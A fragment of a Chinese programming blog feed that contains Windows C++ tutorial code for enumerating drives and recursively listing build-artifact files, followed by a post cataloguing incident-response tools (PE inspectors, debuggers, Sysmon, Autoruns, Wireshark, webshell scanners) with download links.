&#123;&#125;;</span><br><span class="line">GetFileAttributesEx(_T(<span class="string">&quot;D:\\hehe\\123\\haha.txt&quot;</span>), GetFileExInfoStandard, &amp;wfad);</span><br><span class="line"><span class="comment">//5.2 扩展属性</span></span><br><span class="line">wfad.ftCreationTime;<span class="comment">//这里获取到的是时间戳</span></span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line">FileTimeToLocalFileTime(&amp;wfad.ftCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line">FileTimeToSystemTime(&amp;fi, &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="comment">//6. 枚举某一个文件夹下的文件</span></span><br><span class="line">MyEnumFile(_T(<span class="string">&quot;D:\\*&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历盘符"><a href="#遍历盘符" class="headerlink" title="遍历盘符"></a>遍历盘符</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"></span><br><span class="line">DWORD 总容量;</span><br><span class="line">DWORD 空闲容量;</span><br><span class="line">GetLogicalDriveStrings(<span class="number">100</span>, buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> Flag = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//wprintf(_T(&quot;%s  &quot;), pTemp);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = Flag;</span><br><span class="line">li.pszText = pTemp;</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line">ListView_InsertItem(hListCtrl, &amp;li);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = GetDriveType(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line">ListView_SetItemText(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;可移动设备&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line">ListView_SetItemText(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;硬盘&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line">ListView_SetItemText(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;远程设备&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line">ListView_SetItemText(hListCtrl, Flag, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;光驱&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line">GetDiskFreeSpace(pTemp,</span><br><span class="line">&amp;每簇的扇区数量,</span><br><span class="line">&amp;每个扇区的容量,</span><br><span class="line">&amp;空闲簇的总量,</span><br><span class="line">&amp;全部簇的总量</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Flag++;</span><br><span class="line">pTemp += wcslen(buf)+<span class="number">1</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDlg2::EnumFile</span><span class="params">(CString filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//每次遍历都得置0</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">dwConstSize1 = <span class="number">0</span>;</span><br><span class="line">dwConstSize2 = <span class="number">0</span>;</span><br><span class="line">CString cs;</span><br><span class="line"><span class="comment">// 拼接完整路径</span></span><br><span class="line">CString fullPath = filePath + <span class="string">L&quot;\\*&quot;</span>;</span><br><span class="line"><span class="comment">// 查找第一个文件</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = FindFirstFile(fullPath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出文件的信息，</span></span><br><span class="line"><span class="comment">// 过滤两个文件夹……</span></span><br><span class="line"><span class="keyword">if</span> (wcscmp(fileData.cFileName, <span class="string">L&quot;.&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(fileData.cFileName, <span class="string">L&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找到的是目录，递归遍历目录中的其他文件</span></span><br><span class="line"><span class="keyword">if</span> (fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line">EnumFile(filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_FileList.InsertItem(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">DWORD dwSize = (fileData.nFileSizeHigh * (MAXDWORD + <span class="number">1</span>))</span><br><span class="line">+ fileData.nFileSizeLow;</span><br><span class="line"><span class="comment">// 转换成字符串格式</span></span><br><span class="line"></span><br><span class="line">cs.Format(<span class="string">L&quot;%d kb&quot;</span>, dwSize/<span class="number">1024</span>);</span><br><span class="line">m_FileList.SetItemText(i, <span class="number">1</span>, cs);</span><br><span class="line"><span class="comment">// 筛选处指定后缀名的文件</span></span><br><span class="line"><span class="keyword">if</span> (wcscmp(<span class="string">L&quot;.exe&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.obj&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.tlog&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.idb&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.pdb&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.pch&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.res&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.ilk&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.sdf&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.ipch&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.log&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.lastbuildstate&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> </span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">CString csPath;<span class="comment">//保存路径到vector中</span></span><br><span class="line">csPath.Format(<span class="string">L&quot;%s\\%s&quot;</span> , filePath,fileData.cFileName);</span><br><span class="line"></span><br><span class="line">path.push_back(csPath);<span class="comment">//将路径加入vector</span></span><br><span class="line">m_FileList2.InsertItem(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line">m_FileList2.SetItemText(i, <span class="number">1</span>, cs);</span><br><span class="line"></span><br><span class="line">dwConstSize2 += dwSize / <span class="number">1024</span>;</span><br><span class="line">j ++;</span><br><span class="line">&#125;</span><br><span class="line">dwConstSize1 += dwSize / <span class="number">1024</span>;</span><br><span class="line">i++;</span><br><span class="line"><span class="comment">// 继续遍历下一个文件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFile(hFile, &amp;fileData));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows编程 </tag>
            
            <tag> SDK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows————应急响应工具</title>
      <link href="2020/12/05/windows%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/"/>
      <url>2020/12/05/windows%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<p>“工欲善其事，必先利其器。”</p><h2 id="PE工具篇"><a href="#PE工具篇" class="headerlink" title="PE工具篇"></a>PE工具篇</h2><p><strong>PEiD</strong></p><p>一款著名的PE侦壳工具，可以检测PE常见的一些壳，但是目前已经无法从官网获得：</p><p><img src="http://secimg.sangfor.com.cn/FmYRdTYbX7TPKvXpx2mDYW93mU0_" alt="img"></p><p><strong>EXEInfo PE</strong></p><p>PE侦壳工具，PEiD的加强版，可以查看EXE/DLL文件编译器信息、是否加壳、入口点地址、输出表/输入表等等PE信息：</p><p><img src="http://secimg.sangfor.com.cn/FhRcrbfucYGGuY2opmKN7RbGO3C-" alt="img"></p><p>下载地址：<a href="http://www.exeinfo.xn.pl/">http://www.exeinfo.xn.pl/</a></p><p><strong>Detect It Easy</strong></p><p>开源的PE侦壳工具，是一个跨平台的应用程序，有Windows、Linux、Mac OS多个可用版本：</p><p><img src="http://secimg.sangfor.com.cn/Fujln1y1M-8D9hwMLrtmcAs0mn7z" alt="img"></p><p>下载地址：<a href="http://ntinfo.biz/index.html">http://ntinfo.biz/index.html</a></p><p><strong>CFF Explorer</strong></p><p>一款优秀的PE32 &amp; PE64编辑工具，可以方便的查看及编辑PE文件。完全支持.NET文件格式：</p><p><img src="http://secimg.sangfor.com.cn/FgknZl2iNUeHqzHPph56OfUope_k" alt="img"></p><p>下载地址：<a href="https://ntcore.com/?page_id=388">https://ntcore.com/?page_id=388</a></p><p><strong>StudyPE</strong></p><p>PE32 &amp; PE64 查看分析集成工具，具有强大的PE结构处理分析功能，在查壳方面功能略显薄弱：</p><p><img src="http://secimg.sangfor.com.cn/FiYtTe_TvjiJBQHt4cs1KKPBx6vS" alt="img"></p><p>下载地址：<a href="https://bbs.pediy.com/thread-246459-1.htm">https://bbs.pediy.com/thread-246459-1.htm</a></p><h2 id="调试-反编译工具篇"><a href="#调试-反编译工具篇" class="headerlink" title="调试/反编译工具篇"></a>调试/反编译工具篇</h2><p><strong>OllyDbg</strong></p><p>Ring3级调试器，支持插件扩展功能，唯一不足的是OD是一个32位调试器，不支持调试64位程序。官方给出的原版程序是无插件的，有需要的童鞋可以在吾爱破解论坛自行搜索：</p><p><img src="http://secimg.sangfor.com.cn/FqWTNM77E4x0AbV6SjaqL_lyu-0B" alt="img"></p><p>下载地址：<a href="http://www.ollydbg.de/">http://www.ollydbg.de/</a></p><p><strong>WinDbg</strong></p><p>支持Windows平台，用户态和内核态的调试器，有图形界面和命令行两种调试方式。其强大的内核调试功能收获了众多的追捧者：</p><p><img src="http://secimg.sangfor.com.cn/FjV8j9SKhnfi0Ye9GwYtFooiv_B7" alt="img"></p><p>下载地址：  <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools</a></p><p><strong>x32dbg/x64dbg</strong></p><p>一款开源的调试器，从界面和操作使用和OD相似，支持32位和64位应用程序的调试。解决了OD对64位应用程序调试上的缺陷：</p><p><img src="http://secimg.sangfor.com.cn/Fl45YcVE8OjKEePLMCY7bLOf-YmB" alt="img"></p><p>下载地址：<a href="https://x64dbg.com/#start">https://x64dbg.com/#start</a></p><p><strong>dnSpy</strong></p><p>一款针对.NET程序的开源逆向程序的工具。包含了反汇编器，调试器和汇编编辑器等功能组件，支持插件功能：</p><p><img src="http://secimg.sangfor.com.cn/FoRqqjpUHsrYQz1VHnzDvB9_7ORB" alt="img"></p><p>下载地址：<a href="https://github.com/0xd4d/dnSpy">https://github.com/0xd4d/dnSpy</a></p><p><strong>IDA Pro</strong></p><p>全称：Interactive Disassembler Professional，交互式反汇编器专业版，目前最棒的静态反编译工具，是众多安全人士的首选：</p><p><img src="http://secimg.sangfor.com.cn/Fj01GQZuUcP9ICnkYlaFJdEnaFkj" alt="img"></p><p>下载地址：<a href="https://www.hex-rays.com/products/ida/">https://www.hex-rays.com/products/ida/</a></p><p><strong>VB Decompiler</strong></p><p>针对Visual Basic 5.0/6.0开发的程序的反编译器：</p><p><img src="http://secimg.sangfor.com.cn/Fr_VTb5s8Gt-Paf3VQb7qveVC2MN" alt="img"></p><p>下载地址：<a href="https://www.vb-decompiler.org/products/cn.htm">https://www.vb-decompiler.org/products/cn.htm</a></p><h2 id="应急工具篇"><a href="#应急工具篇" class="headerlink" title="应急工具篇"></a>应急工具篇</h2><h3 id="日志相关"><a href="#日志相关" class="headerlink" title="日志相关"></a>日志相关</h3><p><strong>Sysmon</strong></p><p>Windows Sysinternals出品的一款Sysinternals系列中的工具。它以系统服务和设备驱动程序的方法安装在系统上，并保持常驻性。用来监视和记录系统活动，并记录到windows事件日志，可以提供有关进程创建，网络链接和文件创建时间更改的详细信息：</p><p><img src="http://secimg.sangfor.com.cn/FnZaYNtTPakmQJzza3ewAz3xtRdj" alt="img"></p><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</a></p><p><strong>LastActivityView</strong></p><p>是一款电脑操作记录查看器，直接调用系统日志，显示安装软件、系统启动、关机、网络连接、执行exe 的发生时间和路径：</p><p><img src="http://secimg.sangfor.com.cn/Fo_JkgnZRHfQm3VVJVahp0wUkuLq" alt="img"></p><p>下载地址：<a href="http://www.nirsoft.net/utils/computer_activity_view.html">http://www.nirsoft.net/utils/computer_activity_view.html</a></p><h3 id="注册表相关"><a href="#注册表相关" class="headerlink" title="注册表相关"></a>注册表相关</h3><p><strong>Regshot</strong></p><p>注册表比较工具，通过抓取两次注册表快速比较得出两次注册表的不同之处：</p><p><img src="http://secimg.sangfor.com.cn/FpXfuRAOvforO0KzWfyW4wxwLW02" alt="img"></p><p>下载地址：<a href="https://sourceforge.net/projects/regshot/">https://sourceforge.net/projects/regshot/</a></p><p><strong>Autoruns</strong></p><p>基于Windows平台的自动运行程序的管理工具。可以控制登录时的加载程序、驱动程序加载、服务启动、任务计划等 Windows 中各种方面的启动项：</p><p><img src="http://secimg.sangfor.com.cn/Fgk9Yt7Gjg1VbAC_X6k01V6dFf3C" alt="img"></p><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><h3 id="进程相关"><a href="#进程相关" class="headerlink" title="进程相关"></a>进程相关</h3><p><strong>Process Hacker</strong></p><p>一款功能丰富的开源系统进程辅助工具，可以方便的查看进程的运行情况、内存以及模块信息，还可以对进程进行管理：</p><p><img src="http://secimg.sangfor.com.cn/Fs17urKET0Xw765EuBw7gajjXnk_" alt="img"></p><p>下载地址：<a href="https://www.jishuwen.com/jump/aHR0cHM6Ly9wcm9jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvLw==">https://processhacker.sourceforge.io/</a></p><p><strong>PowerTool</strong></p><p>一款免费的进程管理器，可以Unlock占用文件的进程，查看文件或文件夹被占用的情况，内核模块和驱动的查看管理，进程模块的内存dump等工具：</p><p><img src="http://secimg.sangfor.com.cn/Flr-N5EBo2KabppZnKuWnKbvrATJ" alt="img"></p><p>下载地址：<a href="https://www.portablesoft.org/">https://www.portablesoft.org/</a></p><p><strong>Process Lasso</strong></p><p>一款独特的调试进程级别的系统优化工具，主要功能是基于其特别的算法动态调整各个进程优先级以实现为系统减负的目的。可以用来监视进程动作：</p><p><img src="http://secimg.sangfor.com.cn/Fvy-8ZB7oB1SK8ixzyhms9j4EUq-" alt="img"></p><p>下载地址：<a href="https://bitsum.com/">https://bitsum.com/</a></p><h3 id="文件相关"><a href="#文件相关" class="headerlink" title="文件相关"></a>文件相关</h3><p><strong>HashTab</strong></p><p>文件校验工具，分为免费个人版以及付费版。下载安装后可以通过查看文件属性中的HashTab快速得到文件的哈希值，支持多种哈希算法：</p><p><img src="http://secimg.sangfor.com.cn/Fuk18lI8CnnAfxV_0ToCe0mxt-it" alt="img"></p><p>下载地址：<a href="http://implbits.com/products/hashtab/">http://implbits.com/products/hashtab/</a></p><p><strong>Hash Checker</strong></p><p>一款开源的文件校验工具，安装完成后可以通过文件属性中的文件校验快速得到文件的哈希值。支持右键菜单创建校验文件功能和批量校验功能：</p><p><img src="http://secimg.sangfor.com.cn/Fsjfe4epPZiw51woevDQzzV5K34Z" alt="img"></p><p>下载地址：<a href="http://code.kliu.org/hashcheck/">http://code.kliu.org/hashcheck/</a></p><p><strong>Unlocker</strong></p><p> 一款右键扩充工具，通过删除文件和程序关联的方式解除文件的占用。在解除占用时不会强制关闭占用文件进程：</p><p><img src="http://secimg.sangfor.com.cn/FsarFKjk3K4Vb9CgEKg-U8udje5r" alt="img"></p><p>下载地址：<a href="http://emptyloop.com/unlocker/">http://emptyloop.com/unlocker/</a></p><p><strong>Everything</strong></p><p>强大的Windows桌面搜索引擎，可以在NTFS卷上快速的根据名称查找文件和目录：</p><p><img src="http://secimg.sangfor.com.cn/Fl6CLKCqrYStPAuyos154Wx-rzvf" alt="img"></p><p>下载地址：<a href="https://www.voidtools.com/zh-cn/">https://www.voidtools.com/zh-cn/</a></p><p><strong>Winhex</strong></p><p>是一款优秀的十六进制编辑器，在计算机取证，数据恢复，低级数据处理和IT安全领域非常有用：</p><p><img src="http://secimg.sangfor.com.cn/FljKF5P-SVxVV3QkjZRJVF3VWf0S" alt="img"></p><p>下载地址：<a href="https://www.x-ways.net/winhex/">https://www.x-ways.net/winhex/</a></p><p><strong>BinDiff</strong></p><p>一款开源的二进制文件对比工具，可帮助安全人员快速发现反汇编代码中的差异和相似之处。支持x86、MIPS、ARM/AArch64、PowerPC等架构进行二进制文件的对比：</p><p><img src="http://secimg.sangfor.com.cn/FoCvf2Ndw5kaTs_-xwSv3yPE3Pq8" alt="img"></p><p>下载地址：<a href="https://www.zynamics.com/software.html">https://www.zynamics.com/software.html</a></p><p><strong>Beyond Compare</strong></p><p>一款由Scooter Software推出的文件比较工具。主要用于比较两个文件夹或者文件并将差异以颜色标记，比较的范围包括目录，文档内容等：</p><p><img src="http://secimg.sangfor.com.cn/FpNwOFEmE5NZ9DQPucOwIaNOKRpz" alt="img"></p><p>下载地址：<a href="http://www.beyondcompare.cc/xiazai.html">http://www.beyondcompare.cc/xiazai.html</a></p><h3 id="内存相关"><a href="#内存相关" class="headerlink" title="内存相关"></a>内存相关</h3><p><strong>SfAntiBotPro</strong></p><p>内存检索工具，可以根据输入的字符串快速检索计算机内存，输出包含该字符串的进程信息，在进行恶意域名检测时有事半功倍的效果：</p><p><img src="http://secimg.sangfor.com.cn/Fisj6TX1CGCvv0EkZgaO9RkLBY8O" alt="img"></p><p>下载地址：</p><p>（32位）<a href="http://edr.sangfor.com.cn/tool/SfabAntiBot_X86.7z">http://edr.sangfor.com.cn/tool/SfabAntiBot_X86.7z</a></p><p>（64位）<a href="http://edr.sangfor.com.cn/tool/SfabAntiBot_X64.7z">http://edr.sangfor.com.cn/tool/SfabAntiBot_X64.7z</a></p><p><strong>DumpIt</strong></p><p>是一款免安装的Windows内存镜像取证工具，可以使用其轻松的将一个系统的完整内存镜像下来，并用于后续的调查取证工作：</p><p><img src="http://secimg.sangfor.com.cn/Fm5FCK_HFtyN2CdTvBeNl530aTuE" alt="img"></p><p>下载地址：<a href="https://my.comae.com/tools">https://my.comae.com/tools</a></p><h3 id="设备监控"><a href="#设备监控" class="headerlink" title="设备监控"></a>设备监控</h3><p><strong>USBLogView</strong></p><p>一款USB设备监控软件，后台运行，可以记录插入或拔出系统的任何USB的详情信息：</p><p><img src="http://secimg.sangfor.com.cn/FlXs7YYU-a8DzJXvtPpq6nlWGdkH" alt="img"></p><p>下载地址：<a href="https://www.nirsoft.net/utils/usb_log_view.html">https://www.nirsoft.net/utils/usb_log_view.html</a></p><h3 id="集成工具"><a href="#集成工具" class="headerlink" title="集成工具"></a>集成工具</h3><p><strong>PC Hunter</strong></p><p>一款驱动级的系统维护工具，能够查看各种Windows的各类底层系统信息，包括进程、驱动模块、内核、内核钩子、应用层钩子，网络、注册表、文件、启动项、系统杂项、电脑体检等：</p><p><img src="http://secimg.sangfor.com.cn/FkpdE4N8dvxnXu5ED02KnsLLygrR" alt="img"></p><p>下载地址：<a href="http://www.xuetr.com/">http://www.xuetr.com/</a></p><p><strong>Malware Defender</strong></p><p>一款 HIPS (主机入侵防御系统)软件，用户可以自己编写规则来防范病毒、木马的侵害。另外，Malware Defender提供了很多有效的工具来检测和删除已经安装在您的计算机系统中的恶意软件：</p><p><img src="http://secimg.sangfor.com.cn/Fuq35YegwwWBQGQq7t_90oJoQCun" alt="img"></p><p>下载地址：<a href="https://labs.360.cn/malwaredefender/">https://labs.360.cn/malwaredefender/</a></p><p><strong>火绒剑</strong></p><p>一款用于分析、处理恶意程序的安全工具软件，提供了“程序行为监控”、“进程管理”、“文件管理”、“注册表管理”、“系统启动项管理”、”内核程序管理“、“代码钩子扫描”七大功能：</p><p><img src="http://secimg.sangfor.com.cn/Fp86scvIfw7grCv72oq546jTCYFV" alt="img"></p><p>下载地址：</p><p>（火绒剑独立版，不支持win8.1以上的系统）down4.huorong.cn/hrsword.exe</p><h2 id="流量分析工具篇"><a href="#流量分析工具篇" class="headerlink" title="流量分析工具篇"></a>流量分析工具篇</h2><p><strong>WireShark</strong></p><p>一款网络封包分析工具，可以帮助用户深入分析网络协议，涵盖上百种协议以及各类主要平台。通过GUI或TTY-mode浏览数据：</p><p><img src="http://secimg.sangfor.com.cn/Fg1PRTBTZdcnh8CBM9Jt8hXOnv2F" alt="img"></p><p>下载地址：wireshark.org/download.html</p><p><strong>Fiddler</strong></p><p>C#编写的http抓包改包工具，相较wireshark更加轻量级，在http和https数据包的抓取上更加专业。还能设置断点，修改请求和响应的数据，模拟弱网络环境。支持插件扩展:</p><p><img src="http://secimg.sangfor.com.cn/Fs4j7pqWqz0rC_0K33YQebSSAfZv" alt="img"></p><p>下载地址：<a href="https://www.telerik.com/download/fiddler">https://www.telerik.com/download/fiddler</a></p><p><strong>Microsoft Network Monitor</strong></p><p>只支持Windows平台的网络数据分析工具，提供了一个专业的网路实时流量图形界面，拥有识别和监控超过300种网络协议的能力：</p><p><img src="http://secimg.sangfor.com.cn/FnHVVHNZowmCFQCKiIIxyFywS-Kl" alt="img"></p><p>下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=4865">https://www.microsoft.com/en-us/download/details.aspx?id=4865</a></p><p><strong>Capsa Packet Sniffer</strong></p><p>网络分析工具，用于网络监控、故障排除和网络诊断等功能：</p><p><img src="http://secimg.sangfor.com.cn/Fq8P4mKQH9zb2JoP-KYU25zOvbeB" alt="img"></p><p>下载地址：<a href="https://www.colasoft.com/capsa-free/">https://www.colasoft.com/capsa-free/</a></p><p><strong>NetworkMiner</strong></p><p>支持Windows平台的网络取证分析工具，通过嗅探或者分析PCAP文件可以侦测到操作系统，主机名和开放的网络端口主机：</p><p><img src="http://secimg.sangfor.com.cn/Fo7SCo8LtpOqOtVKuk8IxJ_bC18h" alt="img"></p><p>下载地址：<a href="https://sourceforge.net/projects/networkminer/files/networkminer/">https://sourceforge.net/projects/networkminer/files/networkminer/</a></p><p><strong>Angry IP Scanner</strong></p><p>这是一款开源的网络扫描仪，支持Linux，Windows和Mac OS X平台，可以在最短的时间内扫描远端主机IP运作情况，包括主机名，目前开放的端口和IP的运作情况：</p><p><img src="http://secimg.sangfor.com.cn/FqHCvXYKgvEGkeT_xpux2rDEAAJG" alt="img"></p><p>下载地址：<a href="https://angryip.org/">https://angryip.org</a></p><h2 id="WebShell查杀工具篇"><a href="#WebShell查杀工具篇" class="headerlink" title="WebShell查杀工具篇"></a>WebShell查杀工具篇</h2><p><strong>D盾</strong></p><p>D盾是一个专为IIS设计的主动防御保护软件，有一句话免疫，主动后门拦截，SESSION保护，防WEB嗅探，防CC，防篡改，注入防御，防XSS，防提权，上传防御，未知0day防御，异形脚本防御等功能，以内外保护的方式防止网站和服务器被入侵。</p><p><img src="http://secimg.sangfor.com.cn/FkZFJpTtOasrjTKQTYy929Pei9S2" alt="img"></p><p>下载地址：<a href="http://www.d99net.net/">http://www.d99net.net/</a></p><p><strong>WebShellKiller</strong></p><p>WebShellKiller是个Web后门专杀工具，不仅支持Webshell扫描，还支持暗链扫描。该工具将传统的技术与人工智能技术相结合、静态扫描和动态分析相结合，更精准的检测出Web网站已知和未知的后门文件：</p><p><img src="http://secimg.sangfor.com.cn/FitEWKX0YvnmSc2OCm4n3NrVBlQ4" 